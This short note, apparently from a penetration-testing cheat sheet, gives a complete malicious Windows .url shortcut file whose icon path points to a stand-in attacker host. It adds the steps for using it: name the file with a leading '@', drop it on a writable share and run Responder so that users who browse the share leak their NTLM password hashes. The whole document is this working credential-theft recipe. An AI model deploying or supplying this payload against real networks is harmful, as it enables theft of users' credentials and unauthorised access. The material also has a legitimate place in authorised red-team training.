# Overview
to execute this attack we need to have writable share and add our script in it 
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\ATTACKER_IP\%USERNAME%.icon
IconIndex=1

and name the file "@NAME.url"

and then run responder

once the user access the share file the hash will be dumped in responder